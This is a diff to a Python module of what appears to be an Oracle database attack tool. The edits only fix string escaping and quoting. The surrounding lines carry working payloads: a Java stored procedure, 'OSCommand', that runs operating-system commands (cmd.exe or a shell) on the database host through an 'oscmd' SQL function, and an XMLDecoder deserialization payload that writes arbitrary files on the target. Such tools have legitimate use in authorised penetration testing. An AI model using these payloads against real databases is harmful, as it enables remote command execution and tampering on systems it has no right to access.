@@ -17,7 +17,7 @@ class Java (OracleDatabase):
 		'''
 		logging.debug("Java object created")
 		OracleDatabase.__init__(self,args)
-		self.SOURCE_OS_COMMAND_CLASS = """
+		self.SOURCE_OS_COMMAND_CLASS = r"""
 CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCommand" AS
   import java.io.*;
   public class OSCommand {
@@ -32,7 +32,7 @@ CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCommand" AS
 	        systemRootvariable = System.getProperty("SystemRoot");
           }
           finalCommand = new String[4];
-          finalCommand[0] = systemRootvariable+"\\\system32\\\cmd.exe";
+          finalCommand[0] = systemRootvariable+"\\system32\\cmd.exe";
           finalCommand[1] = "/y";
           finalCommand[2] = "/c";
           finalCommand[3] = command;
@@ -95,7 +95,7 @@ CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCommand" AS
   };"""
 		self.SOURCE_OS_COMMAND_CREATE_FUNCTION = "CREATE OR REPLACE FUNCTION oscmd (p_command IN VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME 'OSCommand.executeCommand (java.lang.String) return java.lang.String';"
 		self.SOURCE_OS_COMMAND_EXEC = "select oscmd('{0}') from dual"
-		self.SOURCE_DROP_CLASS = "DROP JAVA SOURCE \"OSCommand\""
+		self.SOURCE_DROP_CLASS = """DROP JAVA SOURCE "OSCommand""""
 		self.SOURCE_DROP_FUNCTION = "DROP FUNCTION oscmd"
 		self.LINUX_CMD_ERROR = 'No such file or directory'
 		self.JAVA_SESSION_CLEARED = "Java session state cleared"
@@ -269,7 +269,7 @@ public class exploitDeserializationJava{
 		CREATE_FUNCTION_EXPLOIT ="CREATE OR REPLACE PROCEDURE exploitDeserialization (xmlcode IN VARCHAR2) IS language java name 'exploitDeserializationJava.input(java.lang.String)';"
 		EXECUTE_FUNCTION = "BEGIN exploitDeserialization('{0}'); END;"
 		XML_CODE = '<java class="java.beans.XMLDecoder" version="1.4.0"><object class="java.io.FileWriter"><string>{0}</string><boolean>True</boolean><void method="write"><string>{1}</string></void><void method="close"/></object></java>' #{0}:Filename on the target, {1}: data to write on the file
-		SOURCE_DROP_CLASS = "DROP JAVA SOURCE \"exploitDeserializationJava\""
+		SOURCE_DROP_CLASS = """DROP JAVA SOURCE "exploitDeserializationJava""""
 		SOURCE_DROP_FUNCTION = "DROP PROCEDURE exploitDeserialization"
 		
 		logging.info("Trying to write {0} in {1} on the target".format(repr(data), remoteFilename))
